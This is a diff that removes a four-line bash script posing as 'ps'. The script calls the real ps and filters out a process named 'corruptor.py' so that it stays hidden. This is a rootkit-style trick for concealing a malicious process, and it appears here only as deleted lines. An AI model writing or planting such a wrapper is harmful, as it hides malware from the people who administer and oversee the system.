@@ -1,4 +1,0 @@
-#!/bin/bash
-# Hijacked ps: Hide the corruptor.py process
-# We use the real ps but filter out the python process
-/bin/ps "$@" | grep -v "corruptor.py"
